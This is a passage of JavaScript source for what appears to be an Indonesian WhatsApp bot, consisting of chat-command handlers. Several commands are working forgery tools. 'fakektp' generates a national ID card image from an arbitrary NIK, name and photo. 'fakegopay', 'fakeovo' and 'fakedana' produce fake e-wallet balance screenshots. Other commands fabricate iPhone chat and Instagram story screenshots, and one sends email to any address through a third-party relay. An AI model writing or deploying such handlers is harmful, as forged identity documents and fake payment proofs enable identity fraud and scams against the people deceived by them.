      let msgii = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": JSON.stringify({
                      "display_text": "Salin Isi Case",
                      "copy_code": caseContent
                    })
                  }
                ]
              })
            })
          }
        }
      }, { userJid: m.sender, quoted: qpayment });
      await client.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id });
    } catch (error) {
      console.error('Error saat mencari case:', error);
      xreply('❌ Gagal mencari case.');
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖪𝖳𝖯 ] ──────────── ///
  case 'fakektp': {
    try {
      if (!text) {
        return xreply(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url\n\n*Format contoh:*\n${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2026|https://cdn.yupra.my.id/yp/vi1275ok.png`);
      }

      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

      const params = text.split('|');
      if (params.length < 18) {
        return xreply(`*⚠️ Parameter kurang!*\n\nDibutuhkan *18 parameter*, tetapi hanya menerima *${params.length}*.\n*Pastikan urutan parameter sesuai contoh!*`);
      }

      const baseURL = 'https://theresapisv3.vercel.app/canvas/ektp';
      const query = new URLSearchParams({
        provinsi: params[0].trim(),
        kota: params[1].trim(),
        nik: params[2].trim(),
        nama: params[3].trim(),
        ttl: params[4].trim(),
        jenis_kelamin: params[5].trim(),
        golongan_darah: params[6].trim(),
        alamat: params[7].trim(),
        'rt/rw': params[8].trim(),
        'kel/desa': params[9].trim(),
        kecamatan: params[10].trim(),
        agama: params[11].trim(),
        status: params[12].trim(),
        pekerjaan: params[13].trim(),
        kewarganegaraan: params[14].trim(),
        masa_berlaku: params[15].trim(),
        terbuat: params[16].trim(),
        pas_photo: params[17].trim()
      });

      const url = `${baseURL}?${query.toString()}`;
      const response = await fetch(url);

      if (!response.ok) {
        Reply(`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
      }

      const buffer = await response.arrayBuffer();
      await client.sendMessage(m.chat, {
        image: Buffer.from(buffer)
      }, { quoted: m });

    } catch (error) {
      xreply(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
    } finally {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
  };
  break

  /// ───────────── [ 𝖢𝖾𝖼𝗄 𝖲𝖺𝗅𝖽𝗈 & 𝖯𝖾𝗌𝖺𝗇 𝖳𝖳 ] ──────────── ///
  case 'ceksaldo': {
    try {
      const axios = require('axios')

      await xreply('⏳ Mengecek saldo...')

      const { data } = await axios.post(
        `https://fayupedia.id/api/services`,
        new URLSearchParams({
          api_id: global.idapi,
          api_key: global.apitiktok
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        }
      )

      if (!data) {
        return xreply('❌ Tidak ada respon dari server')
      }

      if (data.status !== true) {
        return xreply(`❌ ${data.msg || 'Gagal cek saldo'}`)
      }

      Reply(`
💰 *CEK SALDO*

📊 Balance: Rp${data.balance}
📌 Status: ${data.msg}
`)

    } catch (e) {
      console.log(e)

      xreply(
        `❌ Error\n\n${e.response?.data?.msg || e.message}`
      )
    }
  }
  break

  case 'pesantt': {
    try {
      const axios = require('axios')

      if (!text) {
        return xreply(`📦 *PESANTT ORDER*

Cara pakai:
.pesantt <service>|<target>|<quantity>

Contoh:
.pesantt 9|sebastianwirajaya11|100`)
      }

      const parts = text.split('|')

      if (parts.length < 3) {
        return xreply(`❌ Format salah

Contoh:
.pesantt 9|username|100`)
      }

      const service = parts[0].trim()
      const target = parts[1].trim()
      const quantity = parseInt(parts[2])

      if (isNaN(service) || isNaN(quantity)) {
        return xreply(`❌ Service dan quantity harus angka`)
      }

      if (!target) {
        return xreply(`❌ Target tidak boleh kosong`)
      }

      await xreply('⏳ Mengirim pesanan...')

      const { data } = await axios.post(
        `https://fayupedia.id/api/order`,
        new URLSearchParams({
          api_id: global.idapi,
          api_key: global.apitiktok,
          service: service,
          target: target,
          quantity: quantity
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        }
      )

      if (!data) {
        return xreply('❌ Tidak ada respon dari server')
      }

      if (data.status !== true) {
        return xreply(`❌ ${data.msg || 'Gagal membuat pesanan'}`)
      }

      Reply(`
✅ *ORDER BERHASIL*

📦 Pesanan ID: #${data.order}
📌 Status: Diproses
🎯 Target: ${target}
📊 Quantity: ${quantity}
🧾 Service ID: ${service}
`)

    } catch (e) {
      console.log(e)

      xreply(
        `❌ Error\n\n${e.response?.data?.msg || e.message}`
      )
    }
  }
  break

case 'ordertt': {
  try {
    const axios = require('axios')

    await xreply('⏳ Mengambil layanan TikTok...')

    const { data } = await axios.post(
      'https://fayupedia.id/api/services',
      new URLSearchParams({
        api_id: global.idapi,
        api_key: global.apitiktok
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0'
        }
      }
    )

    if (!data?.status) {
      return xreply(`❌ ${data?.msg || 'Gagal mengambil data layanan'}`)
    }

    const ids = [1734, 1334, 1335, 1336, 1337, 1338]

    const services = []

    for (const id of ids) {
      const svc = data.services.find(v => Number(v.id) === id)
      if (svc) services.push(svc)
    }

    if (!services.length) {
      return xreply('❌ Layanan TikTok tidak ditemukan')
    }

    let menu = `📦 *LIST SUNTIK TIKTOK*

Silahkan copy ID layanan menggunakan tombol dibawah.

Contoh Order :

.pesantt

─────────────────

`

    services.forEach((s, i) => {
      menu += `${i + 1}. ${s.name}

🆔 ID : ${s.id}
💰 Harga : Rp${Number(s.price).toLocaleString('id-ID')}
📉 Min : ${s.min}
📈 Max : ${s.max}
🔁 Refill : ${s.refill ? 'Yes' : 'No'}

`
    })

    const thumUrl = "https://files.catbox.moe/x8nxvv.jpg";
    const thum = await getBuffer(thumUrl);
    const thums = await prepareWAMessageMedia(
      { image: thum },
      { upload: client.waUploadToServer }
    );

    const interactive = {
      header: {
        hasMediaAttachment: true,
        imageMessage: thums.imageMessage
      },
      body: { text: menu },
      footer: { text: "TikTok Suntik Service" },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "TikTok Service",
            url: "https://t.me/fyzzy44",
            copy_code: "TikTok",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 6, 7, 999],
            list_title: "TikTok Service",
            button_title: "📋 Pilih Copy Code Tiktok"
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "TikTok Service",
            canonical_url: "https://t.me/fyzzy44",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              has_multiple_buttons: true
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "🛒 ORDER TIKTOK",
              id: ".pesantt"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1734",
              id: "-",
              copy_code: "1734"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1334",
              id: "-",
              copy_code: "1334"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1335",
              id: "-",
              copy_code: "1335"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1336",
              id: "-",
              copy_code: "1336"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1337",
              id: "-",
              copy_code: "1337"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "📦 ID 1338",
              id: "-",
              copy_code: "1338"
            })
          }
        ]
      }
    };

    await client.sendMessage(
      m.chat,
      {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage:
              proto.Message.InteractiveMessage.fromObject(interactive)
          }
        }
      },
      { quoted: m }
    );

  } catch (e) {
    console.log(e)
    xreply(
      `❌ Error

${e.response?.data?.msg || e.message}`
    )
  }
}
break

  /// ───────────── [ 𝖳𝗈𝗎𝗋𝗅 & 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
  case "ttqc": {
    if (!m.quoted) return xreply("❌ Reply foto terlebih dahulu!")
    if (!text || !text.includes("|")) return xreply("❌ Format: .ttqc name|text")

    let [name, pesan] = text.split("|")
    name = name.trim()
    pesan = pesan.trim()

    if (!name || !pesan) return xreply("❌ Name dan text tidak boleh kosong!")
    if (!/image/.test(mime)) return xreply("❌ Reply foto!")

    await xreply("⏳ Tunggu sebentar...")

    try {
      let media = await client.downloadAndSaveMediaMessage(qmsg)
      if (!media) return xreply("❌ Gagal mengunduh foto!")

      const { ImageUploadService } = require("node-upload-images")
      const service = new ImageUploadService("pixhost.to")

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "rafaofficial.png"
      )

      let imageUrl = directLink.toString()

      let apiUrl =
        `https://apii.nexadev.my.id/ttqc` +
        `?url=${encodeURIComponent(imageUrl)}` +
        `&name=${encodeURIComponent(name)}` +
        `&text=${encodeURIComponent(pesan)}`

      let hasil = await fetch(apiUrl)

      if (!hasil.ok) throw new Error("API Error: " + hasil.status)

      let buffer = Buffer.from(await hasil.arrayBuffer())

      await client.sendMessage(
        m.chat,
        {
          image: buffer,
          caption: "✨ TTQC berhasil dibuat!"
        },
        { quoted: m }
      )

      if (fs.existsSync(media)) await fs.unlinkSync(media)

    } catch (e) {
      console.error(e)
      xreply(`❌ Gagal membuat TTQC!\n${e.message}`)
    }
  }
  break

  case 'iqc': {
    if (!text) return reply('gunakan : .iqc jam|batre|pesan\ncontoh : .iqc 18:00|40|hai hai');

    let [time, battery, ...msg] = text.split('|')
    if (!time || !battery || msg.length === 0) throw 'format salahh gunakan :\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai'

    await Reply('Tunggu Sbntr.');

    let messageText = encodeURIComponent(msg.join('|').trim())
    let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=INDOSAT%20OREDOO&messageText=${messageText}&emojiStyle=apple`

    let res = await fetch(url)
    if (!res.ok) throw 'gagal fetch url'

    let buffer = await res.buffer()
    await client.sendMessage(m.chat, { image: buffer }, { quoted: m })
  }
  break

  case 'iqcv2': {
    try {
      if (!m.quoted) {
        return xreply(`*Reply sebuah foto lalu ketik:*

.iqcv2 text|carrier|battery|signal|sender|read

*Contoh:*
.iqcv2 Halo dek sikit aeee|XL|100|4|other|false

*Sender:*
• self
• other

*Read:*
• true
• false`)
      }

      let mime = (m.quoted.msg || m.quoted).mimetype || ""
      if (!/image/.test(mime)) {
        return xreply("❌ Reply foto terlebih dahulu!")
      }

      if (!text) {
        return xreply(`*Format:*

.iqcv2 text|carrier|battery|signal|sender|read`)
      }

      let args = text.split("|")

      if (args.length < 6) {
        return xreply(`Format salah!

.iqcv2 text|carrier|battery|signal|sender|read`)
      }

      let [pesan, carrier, battery, signal, sender, read] = args

      battery = Number(battery)
      signal = Number(signal)

      if (isNaN(battery) || battery < 1 || battery > 100)
        return xreply("Battery harus 1-100")

      if (isNaN(signal) || signal < 1 || signal > 4)
        return xreply("Signal harus 1-4")

      sender = sender.toLowerCase()
      read = read.toLowerCase()

      if (!["self", "other"].includes(sender))
        return xreply("Sender hanya self / other")

      if (!["true", "false"].includes(read))
        return xreply("Read hanya true / false")

      Reply("⏳ Mengupload foto ke Pixhost...")

      const buffer = await m.quoted.download()

      const imageUrl = await uploadPixhost(buffer, "iqcv2.jpg")

      Reply("⏳ Membuat IQC V2...")

      const api = `https://api-nanzz.my.id/docs/api/maker/iqc-gambar.php?text=${encodeURIComponent(pesan)}&url=${encodeURIComponent(imageUrl)}&carrier=${encodeURIComponent(carrier)}&battery=${battery}&signal=${signal}&sender=${sender}&read=${read}`

      await client.sendMessage(
        m.chat,
        {
          image: {
            url: api
          },
          caption:
            `乂 *IQC V2 SUCCESS*

💬 Text : ${pesan}
📡 Carrier : ${carrier}
🔋 Battery : ${battery}%
📶 Signal : ${signal}
👤 Sender : ${sender}
✅ Read : ${read}`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(e)
      xreply(`❌ ${e.message}`)
    }
  }
  break

  case 'igv2': {
    try {
      let q = m.quoted ? m.quoted : m
      let media = await q.download()

      const axios = require('axios')
      const FormData = require('form-data')

      let form = new FormData()
      form.append('name', 'MISTER-MD')
      form.append('text', 'Halo Dunia')
      form.append('file', media, 'image.jpg')

      console.log('FIELDS:')
      console.log(form)

      let res = await axios.post(
        'https://api-nanzz.my.id/docs/api/maker/fake-story-ig2.php',
        form,
        {
          headers: form.getHeaders()
        }
      )

      console.log(res.data)

      xreply(JSON.stringify(res.data))

    } catch (e) {
      console.log(e.response?.data || e)
      xreply(JSON.stringify(e.response?.data || e.message))
    }
  }
  break

  /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖦𝖺𝗆𝖻𝖺𝗋 𝖫𝖺𝗂𝗇 ] ──────────── ///
  case 'fakestory': {
    try {
      const { createCanvas, loadImage } = require('canvas')
      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
      let [username, caption] = text.split('|')
      if (!username || !caption) return xreply(`Kek gini:\n.${command} Ichika|hmm...`)
      const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg'
      const bg = await loadImage(bgUrl)
      const userPP = await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5831/600387261_biyu-offc.jpg')
      const pp = await loadImage(userPP)
      const canvas = createCanvas(720, 1280)
      const ctx = canvas.getContext('2d')
      ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
      const ppX = 40
      const ppY = 250
      const ppSize = 70
      ctx.save()
      ctx.beginPath()
      ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
      ctx.closePath()
      ctx.clip()
      ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
      ctx.restore()
      ctx.font = '28px Arial'
      ctx.fillStyle = '#FFFFFF'
      ctx.textAlign = 'left'
      ctx.textBaseline = 'middle'
      const usernameX = ppX + ppSize + 15
      const usernameY = ppY + ppSize / 2
      ctx.fillText(username, usernameX, usernameY)
      ctx.font = 'bold 30px Arial'
      ctx.fillStyle = '#FFFFFF'
      ctx.textAlign = 'center'
      ctx.textBaseline = 'top'
      const captionX = canvas.width / 2
      const captionY = canvas.height - 650
      const maxWidth = canvas.width - 100
      const lineHeight = 42
      wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight)
      let buffer = canvas.toBuffer()
      await client.sendMessage(m.chat, {
        image: buffer,
        caption: 'Berhasil'
      }, { quoted: m })
    } catch (e) {
      xreply(`❌ Error\nLogs error : ${e.message}`)
    }
    function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
      let line = ''
      for (let i = 0; i < text.length; i++) {
        let testLine = line + text[i]
        let testWidth = ctx.measureText(testLine).width
        if (testWidth > maxWidth && line !== '') {
          ctx.fillText(line, x, y)
          line = text[i]
          y += lineHeight
        } else {
          line = testLine
        }
      }
      if (line) ctx.fillText(line, x, y)
    }
  }
  break

  case 'fakegopay': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakegopay 10000,150,0,Juni

Format:
.fakegopay saldo,koin,terpakai,bulan`);
      }

      let [saldo, koin, terpakai, bulan] = text.split(',');

      if (!saldo || !koin || !terpakai || !bulan) {
        return xreply(`Format salah!

Contoh:
.fakegopay 10000,150,0,Juni`);
      }

      if (isNaN(saldo)) return xreply('Saldo harus berupa angka!');
      if (isNaN(koin)) return xreply('Koin harus berupa angka!');
      if (isNaN(terpakai)) return xreply('Terpakai harus berupa angka!');

      let api = `https://api.synoxcloud.xyz/canvas/fake-gopay?saldo=${encodeURIComponent(saldo)}&koin=${encodeURIComponent(koin)}&terpakai=${encodeURIComponent(terpakai)}&bulan=${encodeURIComponent(bulan)}`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `乂 *FAKE GOPAY*

💰 Saldo : Rp${Number(saldo).toLocaleString('id-ID')}
🪙 Koin : ${Number(koin).toLocaleString('id-ID')}
📉 Terpakai : ${Number(terpakai).toLocaleString('id-ID')}
📅 Bulan : ${bulan}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Fake GoPay');
    }
  }
  break;

  case 'fakeovo': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakeovo 50000000`);
      }

      if (isNaN(text)) {
        return xreply('Nominal harus berupa angka!');
      }

      let nominal = text.trim();

      let api = `https://api-nanzz.my.id/docs/api/maker/fake-ovo.php?text=${encodeURIComponent(nominal)}&amount=test_value&query=test_value&q=test_value`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `乂 *FAKE OVO*

💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Fake OVO');
    }
  }
  break;

  case 'fakedana': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.fakedana 1500000`);
      }

      if (isNaN(text)) {
        return xreply('Nominal harus berupa angka!');
      }

      let nominal = text.trim();

      let api = `https://api-nanzz.my.id/docs/api/maker/fake-dana.php?text=${encodeURIComponent(nominal)}`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: `乂 *FAKE DANA*

💰 Nominal : Rp${Number(nominal).toLocaleString('id-ID')}`
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal membuat Fake Dana');
    }
  }
  break;

  /// ───────────── [ 𝖡𝗅𝗎𝖾 𝖠𝗋𝖼𝗁𝗂𝗏𝖾 & 𝖫𝗈𝗅𝗂 ] ──────────── ///
  case 'blue': {
    try {
      await client.sendMessage(m.chat, {
        react: {
          text: '⏳',
          key: m.key
        }
      })

      const api = 'https://api.synoxcloud.xyz/random/bluearchive'

      await client.sendMessage(m.chat, {
        image: { url: api },
        caption: '✅ Berhasil'
      }, { quoted: m })

    } catch (e) {
      console.error(e)
      await client.sendMessage(m.chat, {
        react: {
          text: '❌',
          key: m.key
        }
      })
    }
  }
  break

  case 'loli': {
    try {
      await xreply('⏳ Mengambil gambar random...')

      const api = 'https://api.synoxcloud.xyz/random/loli'

      await client.sendMessage(
        m.chat,
        {
          image: { url: api },
          caption: '✅ Berhasil mengambil gambar random'
        },
        { quoted: m }
      )

    } catch (err) {
      console.error(err)
      xreply('❌ Gagal mengambil gambar.')
    }
  }
  break

  case 'waifu': {
    try {
      await client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

      const apiUrl = 'https://api.nekolabs.my.id/random/blue-archive'
      const res = await fetch(apiUrl)
      if (!res.ok) throw new Error(`Status ${res.status}`)

      const buffer = await res.arrayBuffer()
      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(buffer),
          caption: '🍁 *Nih Blue Archive nya~*'
        },
        { quoted: m }
      )
    } catch (e) {
      console.error(e)
      await xreply(`🍂 *Ups error:* ${e.message || e}`)
    } finally {
      await client.sendMessage(m.chat, { react: { text: '', key: m.key } })
    }
  }
  break

  /// ───────────── [ 𝖡𝗂𝗇𝖺𝗋𝗒 𝖢𝗈𝗇𝗏𝖾𝗋𝗍𝖾𝗋 ] ──────────── ///
  case 'binary':
  case 'bin': {
    const teks = args.join(' ').trim();
    if (!teks) {
      return client.sendMessage(m.chat, {
        text: `- Contoh penggunaan:\n${prefix}binary --teks "01001000"\n${prefix}binary --binarycode "Hello"`,
      }, { quoted: m });
    }

    try {
      const bintoteks = teks.startsWith('--teks');
      const tekstobin = teks.startsWith('--binarycode');
      if (!bintoteks && !tekstobin) {
        return client.sendMessage(m.chat, {
          text: `- Tentukan mode konversi:\n--teks (binary ke text)\n--binarycode (text ke binary)`,
        }, { quoted: m });
      }
      const input = teks.split(' ').slice(1).join(' ').trim();
      if (!input) {
        return client.sendMessage(m.chat, { text: 'Masukkan teks/binary yang valid' }, { quoted: m });
      }
      let hsil;
      if (bintoteks) {
        const cb = input.replace(/[^01 ]/g, '');
        if (!cb) throw new Error('Binary code tidak valid');
        const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
          },
          body: `input=${encodeURIComponent(cb)}`
        });
        hsil = await res.text();
        if (!res.ok || !hsil || hsil.includes('error')) {
          throw new Error('API gagal memproses');
        }
      } else {
        const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0'
          },
          body: `input=${encodeURIComponent(input)}`
        });
        hsil = await res.text();
        if (!res.ok || !hsil || hsil.includes('error')) {
          throw new Error('API gagal memproses');
        }
      }
      await client.sendMessage(m.chat, { text: hsil }, { quoted: m });
    } catch (error) {
      console.error('Error:', error);
      client.sendMessage(m.chat, {
        text: `Gagal mengkonversi: ${error.message}`,
      }, { quoted: m });
    }
  }
  break

  /// ───────────── [ 𝖫𝖾𝗆𝗈𝗇 𝖬𝖺𝗂𝗅 & 𝖳𝖾𝗆𝗉𝖬𝖺𝗂𝗅 ] ──────────── ///
  case 'lemonmail': {
    const argsxx = text.split('|'); if (args.length < 3) return xreply('Format salah! Gunakan: email|subject|pesan');
    const [target, subject, message] = argsxx;
    xreply('Mengirim email...');
    try {
      const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
      const config = {
        method: 'POST',
        url: 'https://lemon-email.vercel.app/send-email',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
          'Content-Type': 'application/json',
          'sec-ch-ua-platform': '"Android"',
          'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
          'sec-ch-ua-mobile': '?1',
          'origin': 'https://lemon-email.vercel.app',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://lemon-email.vercel.app/',
          'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
          'priority': 'u=1, i'
        },
        data: data
      };
      const axios = require('axios');
      const api = await axios.request(config);
      xreply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
    } catch (error) {
      xreply(`Error: ${error.message}`);
    }
  }
  break

  case 'tempmail': {
    class TempMail {
      constructor() {
        this.cookie = null;
        this.baseUrl = 'https://tempmail.so';
      }

      async updateCookie(response) {
        if (response.headers['set-cookie']) {
          this.cookie = response.headers['set-cookie'].join('; ');
        }
      }

      async makeRequest(url) {
        const axios = require('axios');
        const response = await axios({
          method: 'GET',
          url: url,
          headers: {
            'accept': 'application/json',
            'cookie': this.cookie || '',
            'referer': this.baseUrl + '/',
            'x-inbox-lifespan': '600',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1'
          }
        });

        await this.updateCookie(response);
        return response;
      }

      async initialize() {
        const axios = require('axios');
        const response = await axios.get(this.baseUrl, {
          headers: {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
          }
        });
        await this.updateCookie(response);
        return this;
      }

      async getInbox() {
        const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
        const response = await this.makeRequest(url);
        return response.data;
      }

      async getMessage(messageId) {
        const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
        const response = await this.makeRequest(url);
        return response.data;
      }
    }

    try {
      const mail = new TempMail();
      await mail.initialize();

      const inbox = await mail.getInbox();

      if (!inbox.data?.name) {
        throw new Error('Failed to get temporary email');
      }

      const emailInfo = `Temporary Email\n\n*Email :* ${inbox.data.name}\n *Expired :* 10 minutes\nInbox Status : ${inbox.data.inbox?.length || 0} Pesan\n\n> Email Akan Otomatis Dihapus Setelah 10 Menit`;
      await xreply(emailInfo);

      const state = {
        processedMessages: new Set(),
        lastCheck: Date.now(),
        isRunning: true
      };

      const processInbox = async () => {
        if (!state.isRunning) return;

        try {
          const updatedInbox = await mail.getInbox();

          if (updatedInbox.data?.inbox?.length > 0) {
            const sortedMessages = [...updatedInbox.data.inbox].sort((a, b) =>
              new Date(b.date) - new Date(a.date));

            for (const message of sortedMessages) {
              if (!state.processedMessages.has(message.id)) {
                const messageDetail = await mail.getMessage(message.id);

                let cleanContent = messageDetail.data?.html
                  ? messageDetail.data.html.replace(/<[^>]*>?/gm, '').trim()
                  : 'No text content';

                const messageInfo = `_Ada Pesan Baru Nih_\n\nFrom : ${message.from || 'Anomali'}\n*Subject :* ${message.subject || 'No Subject'}\n\n*Pesan :*\n${cleanContent}`;

                await client.sendMessage(m.chat, { text: messageInfo }, { quoted: m });
                state.processedMessages.add(message.id);
              }
            }
          }
        } catch (error) {
          console.error('Error:', error);
        }
      };

      await processInbox();

      const checkInterval = setInterval(processInbox, 10000);

      setTimeout(() => {
        state.isRunning = false;
        clearInterval(checkInterval);
        xreply('Email Otomatis Di Hapus Setelah 10 Menit');
      }, 600000);

    } catch (error) {
      xreply(`Error: ${error.message}`);
    }
  }
  break

  /// ───────────── [ 𝖠𝗇𝗂𝗆𝖾 𝖥𝗂𝗇𝖽𝖾𝗋 ] ──────────── ///
  case 'animefind': {
    try {
      const quoted = m.quoted ? m.quoted : m
      const mime = (quoted.msg || quoted).mimetype || ''
      if (!/image/.test(mime)) return xreply("Harap reply ke gambar yang mau dicari")
      const media = await quoted.download()
      const detect = async (buffer) => {
        const axios = require('axios')
        const BodyForm = require('form-data')
        const { fromBuffer } = require('file-type')
        return new Promise(async (resolve, reject) => {
          try {
            const BASE_URL = "https://smilingwolf-wd-tagger.hf.space/gradio_api"
            const session_hash = Math.random().toString(36).substring(2)
            const file_name = Math.random().toString(36).substring(2)
            const hr = {
              origin: "https://smilingwolf-wd-tagger.hf.space",
              referer: "https://smilingwolf-wd-tagger.hf.space/",
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
              "content-type": "application/json",
            }
            const { ext, mime } = (await fromBuffer(buffer)) || {}
            const form = new BodyForm()
            form.append("files", buffer, {
              filename: file_name + "." + ext,
              contentType: mime
            })
            const files = await axios.post(BASE_URL + "/upload?" + new URLSearchParams({
              upload_id: session_hash
            }), form, {
              headers: { ...hr, ...form.getHeaders() }
            }).then(i => i.data)
            const file_res = {
              path: files[0],
              mime_type: mime,
              orig_name: file_name + "." + ext,
              meta: { _type: "gradio.FileData" },
              size: buffer.length,
              url: BASE_URL + "/file=" + files[0],
            }
            await axios.post(BASE_URL + "/queue/join?", {
              data: [
                file_res,
                "SmilingWolf/wd-swinv2-tagger-v3",
                0.35,
                true,
                0.85,
                true
              ],
              event_data: null,
              fn_index: 2,
              session_hash,
              trigger_id: 18,
            })
            const stream = await axios.get(BASE_URL + "/queue/data?" + new URLSearchParams({
              session_hash
            }), {
              headers: { ...hr, "content-type": "text/event-stream" },
              responseType: "stream"
            })
            let result = ''
            stream.data.on('data', (chunk) => {
              result += chunk.toString()
              const lines = result.split('\n')
              result = lines.pop()
              for (const line of lines) {
                if (line.startsWith('data: ')) {
                  try {
                    const data = JSON.parse(line.substring(6))
                    if (data.msg !== "process_completed") continue
                    if (!data.success) return resolve({ status: false, data })
                    const dt = data.output.data
                    const is_char = typeof dt[2]?.label === 'string'
                    const res = {
                      prompt: dt[0],
                      rating: dt[1].confidences,
                      character: {
                        name: dt[2]?.label,
                        list: dt[2]?.confidences
                      },
                      tags: {
                        name: dt[3].label,
                        list: dt[3].confidences
                      }
                    }
                    return resolve({
                      status: true,
                      data: res,
                      is_char
                    })
                  } catch (err) {
                    console.error('Error parsing JSON:', err)
                    resolve({ status: false, msg: err.message })
                  }
                }
              }
            })
          } catch (e) {
            reject(e)
          }
        })
      }
      const res = await detect(media)
      const fixed = num => (num * 100).toFixed(2)
      if (!res.is_char) return xreply("Tidak terdeteksi karakter di gambar tersebut")
      const teks = `
*⎣⧉⎤ Karakter yang terdeteksi adalah*
> *Nama:* ${res.data.character.name}
> *Persentase:* ${fixed(res.data.character.list[0].confidence || 0)}%
